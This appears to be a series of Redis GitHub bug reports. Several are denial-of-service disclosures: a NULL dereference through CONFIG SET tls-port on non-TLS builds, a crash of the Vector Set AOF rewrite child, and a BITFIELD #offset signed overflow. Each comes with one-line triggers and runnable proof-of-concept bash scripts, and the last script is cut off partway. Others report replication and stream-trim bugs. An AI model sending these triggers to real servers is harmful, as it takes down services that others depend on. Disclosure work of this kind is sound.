issue.title: [BUG] `CONFIG SET` of TLS options crashes non-TLS Redis builds via NULL connection-type deref (SIGSEGV DoS, `+config|set`-only)
issue.body:
## Describe the bug

When Redis is built without OpenSSL/TLS, `tls-port`, `tls-replication`, and `tls-cluster` remain runtime-modifiable via `CONFIG SET`. Their config apply callbacks call `connTypeConfigure(connectionTypeTls(), ...)`, but in a non-TLS build `connectionTypeTls()` returns `NULL` and `connTypeConfigure()` dereferences it unconditionally — a NULL pointer dereference that takes down the whole `redis-server` process with SIGSEGV.

The sink (`src/connection.h:435`, inline):

```c
static inline int connTypeConfigure(ConnectionType *ct, void *priv, int reconfigure) {
    return ct->configure(priv, reconfigure);   /* ct == NULL -> SIGSEGV */
}
```

The two callers that reach it (`src/config.c`):

```c
/* src/config.c:2756 — applyTlsCfg (used by tls-replication / tls-cluster / cert paths) */
static int applyTlsCfg(const char **err) {
    UNUSED(err);
    if ((server.tls_port || server.tls_replication || server.tls_cluster)
         && connTypeConfigure(connectionTypeTls(), &server.tls_ctx_config, 1) == C_ERR) {
        *err = "Unable to update TLS configuration. Check server logs.";
        return 0;
    }
    return 1;
}

/* src/config.c:2767 — applyTLSPort (used by tls-port) */
static int applyTLSPort(const char **err) {
    if (connTypeConfigure(connectionTypeTls(), &server.tls_ctx_config, 0) == C_ERR) {
        *err = "Unable to update TLS configuration. Check server logs.";
        return 0;
    }
    connListener *listener = listenerByType(CONN_TYPE_TLS);
    ...
}
```

Why `connectionTypeTls()` returns NULL in a non-TLS build (`src/connection.c:109-117`):

```c
ConnectionType *connectionTypeTls(void) {
    static ConnectionType *ct_tls = NULL;
    static int cached = 0;
    if (!cached) {
        cached = 1;
        ct_tls = connectionByType(CONN_TYPE_TLS);   /* not registered when built w/o TLS -> NULL */
    }
    return ct_tls;
}
```

When TLS is not compiled in, `RedisRegisterConnectionTypeTLS()` does nothing but log and returns `C_ERR` (`src/tls.c:1254-1257`), so `CONN_TYPE_TLS` is never registered and `connectionByType()` returns NULL. The apply callbacks never check that result, so enabling TLS at runtime dereferences NULL.

**Permission boundary (verified).** The crash does **not** require admin/SHUTDOWN privileges. An ACL user granted only `+config|set` can trigger it. With no-auth or a config-management exposure, any reachable client can crash the process.

**Build condition (verified).** The current repo build is non-TLS: `src/.make-settings` has `BUILD_TLS=no`, and the binary links no OpenSSL library. The bug affects exactly those deployment artifacts; a TLS-enabled build registers the connection type and is unaffected.

## To reproduce

The PoC below is self-contained and copy/paste-runnable from the repository root. It launches a **non-TLS** `redis-server` with an ACL file defining a user `crasher` permitted only `+config|set`, confirms that user is denied `PING` and `CONFIG GET` (proving the limited boundary), then runs `CONFIG SET tls-port 6380` as that user and checks whether the process died.

> Requires a non-TLS build at `src/redis-server` (the repo default). Verified on commit `d28dd44c4`, `BUILD_TLS=no`, 64-bit Linux/GCC 9.4.

```bash
#!/usr/bin/env bash
# CONFIG SET tls-* NULL-deref DoS on non-TLS builds — self-contained, copy/paste runnable.
set -u
PORT=18055
WORK="$(mktemp -d)"; ERR="$WORK/server.err"; ACL="$WORK/users.acl"
SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"

# Wrap every redis-cli call with GNU timeout 8 as a hard backstop, so an occasional
# redis-cli hang can never leave an orphan or block the script. (This build's redis-cli
# does not accept a --timeout flag, so rely on GNU timeout instead.)
rcli() { timeout 8 "$CLI" "$@"; }

# Kill any stale redis-server left on PORT from a prior run, so a port conflict can't
# make a later `wait`/poll block forever.
pkill -9 -f "redis-server.*--port $PORT" 2>/dev/null; sleep 0.2

cleanup() {
  [ -n "${SRV:-}" ] && kill -9 "$SRV" 2>/dev/null
  pkill -9 -f "redis-server.*--port $PORT" 2>/dev/null   # backstop for any interrupt path
  rm -rf "$WORK"
}
trap cleanup EXIT INT TERM

printf 'user default off\nuser crasher on >pw +config|set ~*\n' > "$ACL"

# Refuse to run against a TLS-enabled build (it would not be vulnerable — avoids a false negative).
if ldd "$SERVER" 2>/dev/null | grep -qiE 'libssl|libcrypto'; then
  echo "This binary links OpenSSL (TLS enabled) — not vulnerable. Use a non-TLS build."; exit 0
fi

# Run in the FOREGROUND (not daemonized) so the SIGSEGV crash report is written to stderr ($ERR)
# before the process dies — a daemonized abort can lose buffered log lines and hide the evidence.
"$SERVER" --port "$PORT" --save "" --appendonly no --dir "$WORK" \
          --logfile /dev/stderr --aclfile "$ACL" >"$ERR" 2>&1 &
SRV=$!
# Connection probe: short 2s timeout on the raw cli (connection refused returns
# instantly), max 20 retries (~4s). Do NOT use rcli (8s) here — that would multiply
# 20x and hang the script if the server is slow to come up.
for i in $(seq 1 20); do timeout 2 "$CLI" -p "$PORT" -a pw --user crasher --no-auth-warning PING >/dev/null 2>&1 && break; sleep 0.2; done

# If SRV is already gone the port was still in use and the server never came up — bail out
# instead of falling through to a poll that has nothing to wait for.
if ! kill -0 "$SRV" 2>/dev/null; then
  echo "server failed to start (port may still be in use). Log tail:"; tail -5 "$ERR" 2>/dev/null; exit 1
fi

echo "=== build state ==="
grep -o 'BUILD_TLS=[a-z]*' src/.make-settings 2>/dev/null || true
echo -n "openssl linked? "; ldd "$SERVER" 2>/dev/null | grep -qiE 'ssl|crypto' && echo "yes (TLS build)" || echo "no (non-TLS build)"

echo; echo "=== permission boundary: crasher has ONLY +config|set ==="
echo -n "PING           -> "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning PING 2>&1 | head -1
echo -n "CONFIG GET ... -> "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning CONFIG GET tls-port 2>&1 | head -1

echo; echo "=== trigger: CONFIG SET tls-port 6380 (as +config|set-only user) ==="
echo -n "reply: "; rcli -p "$PORT" -a pw --user crasher --no-auth-warning CONFIG SET tls-port 6380 2>&1 | head -1

# Poll whether the server died within 3s. Do NOT use `wait $SRV` — if the server fails to
# crash (port conflict, command not delivered, non-TLS build guard slipped, etc.) `wait`
# blocks forever and the whole script hangs. The bounded poll below always terminates.
dead=0
for i in $(seq 1 30); do kill -0 "$SRV" 2>/dev/null || { dead=1; break; }; sleep 0.1; done
if [ "$dead" = 1 ]; then
  echo "VERDICT: server CRASHED — SIGSEGV DoS reproduced as +config|set-only user."
else
  echo "VERDICT: ALIVE (no crash within 3s — likely not a non-TLS build, or command not delivered)."
fi
echo; echo "=== crash evidence from server log ==="
grep -iE 'Missing implement of connection type tls|crashed by signal|cmd=config|set user=crasher' "$ERR" 2>/dev/null | head -8
```

Observed output on the non-TLS build (commit `d28dd44c4`, `BUILD_TLS=no`):

```text
=== build state ===
BUILD_TLS=no
openssl linked? no (non-TLS build)

=== permission boundary: crasher has ONLY +config|set ===
PING           -> NOPERM User crasher has no permissions to run the 'ping' command
CONFIG GET ... -> NOPERM User crasher has no permissions to run the 'config|get' command

=== trigger: CONFIG SET tls-port 6380 (as +config|set-only user) ===
reply: Error: Server closed the connection

VERDICT: server CRASHED — SIGSEGV DoS reproduced as +config|set-only user.

=== crash evidence from server log ===
... # Missing implement of connection type tls
... # Redis 255.255.255 crashed by signal: 11, si_code: 1
... cmd=config|set user=crasher ...
```

Process exit status is **139** (SIGSEGV, core dumped). All three claimed triggers were verified to crash individually (each on a fresh server):

```text
  tls-replication yes: CRASHED — crashed by signal: 11
  tls-cluster yes:     CRASHED — crashed by signal: 11
  tls-port 6380:       CRASHED — crashed by signal: 11
  tcp-port 6380:       ALIVE                          (non-TLS control: safe)
```

Equivalent bare `redis-cli` commands on a non-TLS server (any one crashes it):

```text
CONFIG SET tls-port 6380          # via applyTLSPort
CONFIG SET tls-replication yes    # via applyTlsCfg
CONFIG SET tls-cluster yes        # via applyTlsCfg
```

## Expected behavior

In a build without TLS support, `CONFIG SET` of any `tls-*` enabling directive must return a plain error (e.g. `ERR CONFIG SET failed: TLS is not built/enabled`) and leave the process running. A non-TLS binary must not crash — the missing connection type is a known, expectable runtime condition (`connectionTypeTls()` is explicitly documented as possibly NULL), so applying a TLS config must handle it.

## Additional information

- **Sink:** `src/connection.h:435` (`ct->configure(priv, reconfigure)` with `ct == NULL`).
- **Callers:** `applyTlsCfg` (`src/config.c:2756`) and `applyTLSPort` (`src/config.c:2767`). The source report cited lines 2760/2761/2770; the current tree is 2758/2760/2768 (a ~2-line drift — same locations).
- **`connectionTypeTls()`:** `src/connection.c:109`, intentionally NULL-safe. `RedisRegisterConnectionTypeTLS()` (`src/tls.c:1254`) no-ops + logs `Connection type tls not builtin` in non-TLS builds.
- **Reach:** the three `tls-*` directives are declared `MODIFIABLE_CONFIG`, so they are writable at runtime even when the feature is absent, which is the precondition for the crash.
- **Verified:** commit `d28dd44c4`, `BUILD_TLS=no`, `malloc=libc bits=64`, GCC 9.4 / 64-bit Linux. ACL `user ... +config|set ~*` (no `+ping`, no `+config|get`, no `+@admin`) reproduces the crash — confirms the low permission boundary. Exit 139, `crashed by signal: 11`.
- **Scope:** affects only non-TLS builds. A TLS-enabled build registers the type and `connTypeConfigure` runs normally. Default Redis builds (`BUILD_TLS=no`) are vulnerable; users who compile with `BUILD_TLS=yes` are not.
- **Suggested fix:** in `applyTlsCfg`/`applyTLSPort`, check the `connectionTypeTls()` result and, when TLS is not built/enabled, return a normal `CONFIG SET failed ... TLS is not built/enabled` error (return 0 with `*err`) instead of calling `connTypeConfigure(NULL, ...)`. Equivalently, make `connTypeConfigure` itself NULL-guard. Consider also hiding/mark-as-unavailable the TLS-enabling directives in non-TLS builds so they cannot be set at all.

```c
static int applyTlsCfg(const char **err) {
    UNUSED(err);
    if (server.tls_port || server.tls_replication || server.tls_cluster) {
        ConnectionType *ct = connectionTypeTls();
        if (ct == NULL || connTypeConfigure(ct, &server.tls_ctx_config, 1) == C_ERR) {
            *err = "Unable to update TLS configuration: TLS is not built/enabled. Check server logs.";
            return 0;
        }
    }
    return 1;
}
/* applyTLSPort: same NULL-check on connectionTypeTls() before connTypeConfigure(). */
```

issue.title: redis.set_repl() does not suppress commands queued via alsoPropagate() (e.g. SPOP still replicates SREM after REPL_NONE)
issue.body:
### Describe the bug

`redis.set_repl(redis.REPL_NONE)` in a Lua script does not suppress the effect commands that a command queues itself via `alsoPropagate()`. For example SPOP inside a script still propagates SREM to replicas (and to the AOF).

Found while discussing https://github.com/redis/redis/pull/15331#discussion_r3782475903 (cc @sundb @oranagra).

### To reproduce

```
sadd myset a b c d e
eval "redis.set_repl(redis.REPL_NONE); redis.call('spop', 'myset', 2)" 0
```

Output from `./src/redis-cli --replica`:

```
"SREM","myset","a","d"
```

### Expected behavior

With `REPL_NONE`, nothing should be propagated: the replica should not receive the SREM.

### Root cause

The `flags` passed to `call()` carry the selective targets from `redis.set_repl()` (and selective module `RM_Call`), but `call()` only applies this mask to the verbatim propagation it does itself at the end of `call()` (src/server.c, `!(flags & CMD_CALL_PROPAGATE_REPL)` / `!(flags & CMD_CALL_PROPAGATE_AOF)`).

Commands that replace their own propagation call `preventCommandPropagation()` and queue replacement commands with a hard-coded target, e.g. SPOP in `spopWithCountCommand` (src/t_set.c):

```c
alsoPropagate(c->db->id, propargv, propindex, PROPAGATE_AOF | PROPAGATE_REPL);
```

`propagatePendingCommands()` then flushes these ops with their stored targets as-is, so the `set_repl()` mask is never applied to them. The command proc has no way to see the current `call()` flags, so it cannot honor them.

Other commands using the same `alsoPropagate()` pattern (t_stream.c, t_hash.c, etc.) should be affected the same way.

issue.title: replica output buffer soft limit is not raised to repl-backlog-size, so replicas are disconnected anyway
issue.body:
Summary
The comment above the output-buffer check states that a replica `client-output-buffer-limit` smaller than `repl-backlog-size` is ignored, and gives the reason: the partial sync would otherwise succeed and the replica would then be disconnected. Only the hard limit implements that rule. The soft limit is compared against the configured value, so a replica whose buffer grows past the configured soft limit is closed after `soft_limit_seconds` — the exact sequence the comment describes as something to avoid.

Affected code: src/networking.c:5501–5516. Unchanged in current master 33c2a2a145d3f09b42503df27d3ffbc76f34e32c.

Reachable disconnect sequence
1. Master is configured with `repl-backlog-size 128mb` and leaves the replica output buffer limit at its default soft limit (64mb / 60s), or sets it explicitly below the backlog.
2. A replica attaches. The master allocates the replication backlog and the replica begins consuming it.
3. The replica stalls — a slow link, a long `DEBUG SLEEP`, a paused process — so shared replication-buffer memory attributable to that replica grows past 64mb while remaining below the raised hard limit.
4. `clientsCronRunClient()` calls `checkClientOutputBufferLimits()`. The hard comparison at 5511–5512 uses the value raised at 5509–5510 and does not fire. The soft comparison at 5514–5515 uses the unraised `soft_limit_bytes` and fires, setting `soft`.
5. Once `soft_limit_seconds` elapses the client is closed and the replica has to resynchronise, even though the buffer never approached the backlog the master had already committed to hold.

With the default `repl-backlog-size 1mb` the backlog is smaller than the default soft limit, so the two paths agree and the inconsistency is invisible; it only appears when the backlog is configured larger than the soft limit, which is a supported and documented combination.

The consequence is availability only: an unexpected replica disconnect and the resync churn that follows. No data is corrupted and no access control is affected, which is why I am reporting it as a bug rather than privately.

Suggested fix
Apply the same normalisation to the soft limit that the hard limit already receives, so both compare against a value that is at least the backlog the master has committed to hold.

```c
    size_t hard_limit_bytes = server.client_obuf_limits[class].hard_limit_bytes;
    size_t soft_limit_bytes = server.client_obuf_limits[class].soft_limit_bytes;

    if (class == CLIENT_TYPE_SLAVE) {
        if (hard_limit_bytes && (long long)hard_limit_bytes < server.repl_backlog_size)
            hard_limit_bytes = server.repl_backlog_size;
        if (soft_limit_bytes && (long long)soft_limit_bytes < server.repl_backlog_size)
            soft_limit_bytes = server.repl_backlog_size;    /* missing today */
    }
```

and use the local `soft_limit_bytes` at 5514–5515 instead of reading the config field again.

issue.title: [BUG] Vector Set pure AOF rewrite NULL callback dereference child-process DoS
issue.body:
**Describe the bug**

The built-in `vectorset` module registers its module data type with a NULL `aof_rewrite` method:

```c
// modules/vector-sets/vset.c:2291-2298
RedisModuleTypeMethods tm = {
    .version = REDISMODULE_TYPE_METHOD_VERSION,
    .rdb_load = VectorSetRdbLoad,
    .rdb_save = VectorSetRdbSave,
    .aof_rewrite = NULL,
    .mem_usage = VectorSetMemUsage,
    .free = VectorSetFree,
    .digest = VectorSetDigest
};
```

`RM_CreateDataType()` accepts that NULL method and stores it in the runtime `moduleType`:

```c
// src/module.c:7525-7528
mt->rdb_load = tms->rdb_load;
mt->rdb_save = tms->rdb_save;
mt->aof_rewrite = tms->aof_rewrite;
mt->mem_usage = tms->mem_usage;
```

When Redis performs a pure AOF rewrite (`aof-use-rdb-preamble no`) over a database containing a Vector Set key, the AOF rewrite path unconditionally invokes that callback:

```c
// src/aof.c:2487-2492
int rewriteModuleObject(rio *r, robj *key, robj *o, int dbid) {
    RedisModuleIO io;
    moduleValue *mv = o->ptr;
    moduleType *mt = mv->type;
    moduleInitIOContext(&io, &mt->entity, r, key, dbid);
    mt->aof_rewrite(&io,key,mv->value);
```

A remote client that can create a Vector Set key and trigger AOF rewrite can therefore crash the AOF rewrite child process with a NULL function pointer dereference. In the verified run the parent Redis process survived, but AOF rewrite failed and `aof_last_bgrewrite_status` became `err`. Repeated triggers can keep AOF compaction/rewrite unavailable and consume fork/rewrite resources.

**To reproduce**

Trigger conditions:

- The Redis binary includes built-in Vector Sets. The existing `src/redis-server` in this repository does.
- AOF is enabled and pure AOF rewrite is selected: `appendonly yes` and `aof-use-rdb-preamble no`.
- The attacker can run `VADD` to create a Vector Set key.
- The attacker can run `BGREWRITEAOF`, or the instance is configured to auto-trigger AOF rewrite.

Minimal trigger:

```text
VADD vk VALUES 2 1 2 elem1
BGREWRITEAOF
```

Run
```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
REDIS_SERVER="$ROOT_DIR/src/redis-server"
REDIS_CLI="$ROOT_DIR/src/redis-cli"

if [[ ! -x "$REDIS_SERVER" || ! -x "$REDIS_CLI" ]]; then
  echo "[-] Missing built Redis binaries under $ROOT_DIR/src"
  exit 1
fi

TMPDIR="$(mktemp -d /tmp/redis-vset-aof-null.XXXXXX)"
PORT=$((30000 + RANDOM % 20000))
PIDFILE="$TMPDIR/redis.pid"
LOGFILE="$TMPDIR/redis.log"

cleanup() {
  "$REDIS_CLI" -p "$PORT" shutdown nosave >/dev/null 2>&1 || true
  if [[ "${KEEP_TMP:-0}" != "1" ]]; then
    rm -rf "$TMPDIR"
  else
    echo "[*] Keeping temporary dir: $TMPDIR"
  fi
}
trap cleanup EXIT

echo "[*] Repository: $ROOT_DIR"
echo "[*] Temporary dir: $TMPDIR"
echo "[*] Redis port: $PORT"

"$REDIS_SERVER" \
  --port "$PORT" \
  --bind 127.0.0.1 \
  --protected-mode no \
  --dir "$TMPDIR" \
  --logfile "$LOGFILE" \
  --pidfile "$PIDFILE" \
  --daemonize yes \
  --save "" \
  --appendonly yes \
  --aof-use-rdb-preamble no

for _ in $(seq 1 50); do
  if "$REDIS_CLI" -p "$PORT" ping >/dev/null 2>&1; then
    break
  fi
  sleep 0.1
done

if ! "$REDIS_CLI" -p "$PORT" ping >/dev/null 2>&1; then
  echo "[-] Redis did not start"
  tail -80 "$LOGFILE" || true
  exit 1
fi

if ! "$REDIS_CLI" -p "$PORT" COMMAND INFO VADD | grep -q '^VADD$'; then
  echo "[-] VADD command is not available; this binary may not include Vector Sets"
  exit 2
fi

echo "[*] Creating a Vector Set key"
"$REDIS_CLI" -p "$PORT" --raw VADD vk VALUES 2 1 2 elem1
echo "[*] Key type: $("$REDIS_CLI" -p "$PORT" --raw TYPE vk)"

echo "[*] Triggering pure AOF rewrite"
"$REDIS_CLI" -p "$PORT" --raw BGREWRITEAOF

for _ in $(seq 1 100); do
  in_progress="$("$REDIS_CLI" -p "$PORT" INFO persistence | awk -F: '/^aof_rewrite_in_progress:/{gsub(/\r/,"",$2); print $2}')"
  [[ "$in_progress" == "0" ]] && break
  sleep 0.1
done

status="$("$REDIS_CLI" -p "$PORT" INFO persistence | awk -F: '/^aof_last_bgrewrite_status:/{gsub(/\r/,"",$2); print $2}')"
failures="$("$REDIS_CLI" -p "$PORT" INFO persistence | awk -F: '/^aof_rewrites_consecutive_failures:/{gsub(/\r/,"",$2); print $2}')"

echo "[*] aof_last_bgrewrite_status: $status"
echo "[*] aof_rewrites_consecutive_failures: $failures"
echo "[*] Crash markers:"
grep -E 'crashed by signal: 11|Accessing address: \\(nil\\)|Background AOF rewrite terminated by signal 11|rewriteObject|rewriteAppendOnlyFile' "$LOGFILE" || true

if [[ "$status" == "err" ]] && \
   grep -q 'crashed by signal: 11' "$LOGFILE" && \
   grep -q 'Background AOF rewrite terminated by signal 11' "$LOGFILE"; then
  echo "[+] VULNERABLE: Vector Set pure AOF rewrite crashed the rewrite child process"
  exit 0
fi

echo "[-] Not reproduced. The binary may be fixed or not using the vulnerable rewrite path."
exit 2

```

**Expected behavior**

Verified with the existing repository binaries, without rebuilding.

Key output:

```text
VADD vk VALUES 2 1 2 elem1
1
TYPE vk
vectorset
BGREWRITEAOF
Background append only file rewriting started
aof_last_bgrewrite_status:err
aof_rewrites_consecutive_failures:1
```

Crash evidence from the server log:

```text
Redis 255.255.255 crashed by signal: 11, si_code: 1
Accessing address: (nil)
redis-aof-rewrite ... rewriteObject+0x150
redis-aof-rewrite ... rewriteAppendOnlyFileRio+0x67c
redis-aof-rewrite ... rewriteAppendOnlyFileBackground+0x1d7
Background AOF rewrite terminated by signal 11
```

**Additional information**

The preferred fix is to implement `VectorSetAofRewrite` and emit the `VADD` command sequence needed to rebuild the Vector Set during pure AOF rewrite.

The core should also defend the hook boundary: `rewriteModuleObject()` should check `mt->aof_rewrite != NULL` before calling it. If a module type cannot support pure AOF rewrite, Redis should return a recoverable rewrite error, force the RDB preamble path, or reject the registration/configuration combination instead of calling a NULL function pointer.

issue.title: [BUG] `XTRIM`/`XADD ... MAXLEN = n ACKED` stops at the listpack node holding the trim boundary, so the result depends on node layout and replicas / the AOF diverge from the master
issue.body:
**Describe the bug**

With an exact `MAXLEN = n` and the `ACKED` strategy, `streamTrim()` (`src/t_stream.c`) walks the nodes from the head. A node that is not entirely inside the trim range (`s->length - entries < maxlen`) is processed entry by entry, and then the loop ends:

```c
if (node_eligible_for_remove)
    continue;

break; /* If we are here, there was enough to delete in the current
          node, so no need to go to the next node. */
```

That assumption holds for `KEEPREF` / `DELREF`, which delete every entry they visit. It does not hold for `ACKED`, which skips entries that are still pending. When the boundary node holds pending entries, the trim stops with the stream still longer than `n`, even though later nodes hold entries that every group has acknowledged. Every later trim stops at the same place, so one lagging consumer prevents the stream from ever being trimmed down to `n`.

How far the trim gets depends on where the node boundaries are, i.e. on `stream-node-max-entries` / `-bytes` and on the history of the stream (tombstones keep their slots in a node; an AOF rewrite repacks the nodes without them). Exact trims are propagated verbatim (only `~` trims are rewritten by `streamRewriteTrimArgument()`), so a replica or an AOF replay that has a different node layout deletes a different set of entries than the master:

- after an AOF rewrite (`aof-use-rdb-preamble no`) and a restart, entries the master had trimmed come back;
- a replica with a different `stream-node-max-entries` deletes entries the master keeps.

`MINID = id ACKED` is not affected. #14623 removed the same kind of early exit from the approximate path; the exact path still has it.

**To reproduce**

(a) Default configuration, one server. 150 entries form two nodes (100 + 50). A group has read all of them; `51-0..100-0` are still pending, the rest are acknowledged:

```
for i in $(seq 1 150); do echo "XADD a $i-0 f v$i"; done | redis-cli
redis-cli XGROUP CREATE a g 0
redis-cli XREADGROUP GROUP g c COUNT 200 STREAMS a '>' > /dev/null
( echo -n "XACK a g"; for i in $(seq 1 50) $(seq 101 150); do echo -n " $i-0"; done; echo ) | redis-cli
redis-cli XTRIM a MAXLEN = 60 ACKED
redis-cli XLEN a
redis-cli XTRIM a MAXLEN = 60 ACKED
redis-cli XADD a ACKED MAXLEN = 60 151-0 f v
redis-cli XTRIM a MINID = 141-0 ACKED
```

```
XTRIM a MAXLEN = 60 ACKED -> 50 deleted; XLEN 100   (expected 60: 101-0..140-0 are acknowledged by every group but stay)
again: XTRIM a MAXLEN = 60 ACKED -> 0 deleted; XLEN 100
XADD a ACKED MAXLEN = 60 151-0 f v -> 151-0; XLEN 101
XTRIM a MINID = 141-0 ACKED -> 40 deleted; XLEN 61  (MINID is not affected)
```

(b) The AOF rewrite repacks the nodes, and a restart brings trimmed entries back:

```
redis-cli CONFIG SET stream-node-max-entries 4
redis-cli CONFIG SET aof-use-rdb-preamble no
redis-cli CONFIG SET appendonly yes
redis-cli XADD b 1-0 f v; redis-cli XADD b 2-0 f v; redis-cli XADD b 3-0 f v; redis-cli XADD b 4-0 f v
redis-cli XDEL b 4-0                                      # node 1: 1-0 2-0 3-0 (+ tombstone of 4-0)
redis-cli XADD b 5-0 f v; redis-cli XADD b 6-0 f v; redis-cli XADD b 7-0 f v   # node 2: 5-0 6-0 7-0
redis-cli XGROUP CREATE b g 0
redis-cli XREADGROUP GROUP g c COUNT 10 STREAMS b '>' > /dev/null
redis-cli XACK b g 5-0 6-0 7-0                            # 1-0..3-0 stay pending
redis-cli BGREWRITEAOF                                    # base file rebuilds nodes as [1-0 2-0 3-0 5-0] [6-0 7-0]
redis-cli XTRIM b MAXLEN = 3 ACKED
redis-cli XRANGE b - +
redis-cli DEBUG LOADAOF                                   # same as a restart (needs enable-debug-command)
redis-cli XRANGE b - +
```

```
XTRIM b MAXLEN = 3 ACKED -> 3; entries: 1-0 2-0 3-0
after DEBUG LOADAOF (= restart): 1-0 2-0 3-0 6-0 7-0
```

(c) A replica with the default `stream-node-max-entries` (100), while the master has 4 (e.g. after a `CONFIG SET` on the master only):

```
# master (stream-node-max-entries 4), replica attached
XADD c 1-0 f v; XADD c 2-0 f v; XADD c 3-0 f v; XADD c 5-0 f v; XADD c 6-0 f v; XADD c 7-0 f v
XGROUP CREATE c g 0
XREADGROUP GROUP g x COUNT 10 STREAMS c >
XACK c g 5-0 6-0 7-0
XTRIM c MAXLEN = 3 ACKED
```

```
XTRIM c MAXLEN = 3 ACKED -> 1
primary: 1-0 2-0 3-0 6-0 7-0
replica: 1-0 2-0 3-0
```

The full script runs all three parts and takes the binary directory as `REDIS_BIN`: <attach `acked_maxlen.sh`>

**Expected behavior**

`XTRIM key MAXLEN = n ACKED` should keep deleting acknowledged entries, across node boundaries, until the stream has `n` entries or no acknowledged entry is left in the range it may trim. In (a) that means `XLEN 60`. The result should not depend on the node layout, so the master, its replicas and its AOF end with the same entries. A possible fix is to `continue` to the next node in the `ACKED` case while `s->length > maxlen`, as #14623 did for the approximate path. Another is to rewrite the propagated exact `MAXLEN` trim into something deterministic, e.g. a `MINID` / explicit ID list of what the master actually deleted.

**Additional information**

- Reproduced on `unstable` 5e332cabd547d272783cf233a34c81dcb9ea44b3 (2026-10-17; it includes #15936) and on the 8.10.2 release, with the same output for all three parts. Linux x86_64, default build.
- Related but different: #14656 / #14623 (approximate `MAXLEN ~ ACKED` deleted nothing; fixed for `~` only), and #15934 / #15936 (`MINID ~` with `DELREF` / `ACKED` propagated with the wrong threshold). Here the trim is exact and is propagated unchanged; the divergence comes from the early exit plus differing node layouts.
- Replica full sync, RDB / RDB-preamble AOF and `DUMP` / `RESTORE` copy the listpacks as they are, so they produce the same result as the master. Only paths that rebuild the nodes diverge: a replica with other node limits, or a plain-command AOF base.

issue.title: [BUG] Redis BITFIELD `#offset` Signed Overflow DoS
issue.body:
**Describe the bug**

Redis `BITFIELD` and `BITFIELD_RO` support the `#<offset>` syntax, where the element offset is multiplied by the current bitfield width to produce the real bit offset. The runtime code performs that multiplication in signed `long long` before checking for negative values or the maximum string length:

```c
/* src/bitops.c:getBitOffsetFromArgument() */
if (usehash) loffset *= bits;

if (loffset < 0 || (!mustObeyClient(c) && (loffset >> 3) >= server.proto_max_bulk_len))
{
    addReplyError(c,err);
    return C_ERR;
}
```

If a client supplies a `#offset` that is accepted by `string2ll()` but overflows after multiplication by the bit width, `loffset *= bits` triggers signed integer overflow. UBSAN builds, or hardened builds that trap signed overflow, abort the Redis process and cause a remotely triggerable denial of service.

**To reproduce**

Affected Runtime Code:

- `src/bitops.c:714`: `getBitOffsetFromArgument()` parses bit offsets for bit commands.
- `src/bitops.c:721`: enables multiplication for `BITFIELD` `#<offset>` syntax.
- `src/bitops.c:730`: sink, `loffset *= bits` is evaluated before bounds checks.
- `src/bitops.c:1931`: `BITFIELD`/`BITFIELD_RO` parsing calls this sink.

A client allowed to run `BITFIELD_RO` or `BITFIELD` sends a bitfield subcommand with `#offset`. For `i64`, the field width is 64, and the following offset is `floor(LLONG_MAX / 64) + 1`:

```sh
redis-cli BITFIELD_RO k GET i64 '#144115188075855872'
```

The same sink is reachable through the write command name as well:

```sh
redis-cli BITFIELD k GET i64 '#144115188075855872'
```

POC:

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
TMP="$(mktemp -d /tmp/redis-bitfield-offset-overflow.XXXXXX)"
SRC="${TMP}/srcroot"

cleanup() {
    pkill -P "$$" 2>/dev/null || true
    rm -rf "${TMP}"
}
trap cleanup EXIT

need() {
    if ! command -v "$1" >/dev/null 2>&1; then
        echo "missing required command: $1" >&2
        exit 1
    fi
}

need make
need tar
need grep

echo "[1/4] Copying current Redis workspace to ${SRC}"
mkdir -p "${SRC}"
(
    cd "${ROOT}"
    tar \
        --exclude='.git' \
        --exclude='.bug_agent' \
        --exclude='bug' \
        --exclude='chain' \
        --exclude='real_bug' \
        --exclude='src/.make-*' \
        --exclude='deps/.make-*' \
        --exclude='deps/*/.make-*' \
        --exclude='src/*.o' \
        --exclude='src/*.d' \
        --exclude='src/redis-server' \
        --exclude='src/redis-server-*' \
        --exclude='src/redis-cli' \
        --exclude='src/redis-cli-*' \
        -cf - .
) | tar -C "${SRC}" -xf -

echo "[2/4] Building temporary UBSAN Redis"
make -C "${SRC}/src" \
    SANITIZER=undefined \
    MALLOC=libc \
    OPTIMIZATION=-O0 \
    PROG_SUFFIX=-ubsan \
    redis-server-ubsan redis-cli-ubsan \
    -j"$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 2)" >/dev/null

SERVER="${SRC}/src/redis-server-ubsan"
CLI="${SRC}/src/redis-cli-ubsan"
OFFSET="#144115188075855872"

run_trigger() {
    local name="$1"
    local port="$2"
    shift 2

    local rundir="${TMP}/${name}"
    local log="${rundir}/server.log"
    mkdir -p "${rundir}"

    echo "[3/4] Triggering ${name}: $*"
    UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 \
        "${SERVER}" --port "${port}" --bind 127.0.0.1 \
        --save '' --appendonly no --dir "${rundir}" --daemonize no \
        >"${log}" 2>&1 &
    local spid=$!

    local ready=0
    for _ in $(seq 1 100); do
        if kill -0 "${spid}" 2>/dev/null && "${CLI}" -p "${port}" PING >/dev/null 2>&1; then
            ready=1
            break
        fi
        sleep 0.05
    done
    if [[ "${ready}" -ne 1 ]]; then
        echo "FAILED: Redis did not start for ${name}" >&2
        tail -120 "${log}" >&2 || true
        exit 1
    fi

    set +e
    "${CLI}" -p "${port}" "$@" >"${rundir}/cli.out" 2>"${rundir}/cli.err"
    local cli_rc=$?
    sleep 0.5
    "${CLI}" -p "${port}" PING >"${rundir}/ping.out" 2>"${rundir}/ping.err"
    local ping_rc=$?
    kill -0 "${spid}" 2>/dev/null
    local alive_rc=$?
    set -e

    echo "    redis-cli exit: ${cli_rc}"
    if [[ -s "${rundir}/cli.err" ]]; then
        sed 's/^/    cli: /' "${rundir}/cli.err"
    fi
    if [[ -s "${rundir}/ping.err" ]]; then
        sed 's/^/    ping: /' "${rundir}/ping.err"
    fi
    grep -En "runtime error|signed integer overflow|bitops.c:730|Ready to accept" "${log}" \
        | sed 's/^/    log: /' || true

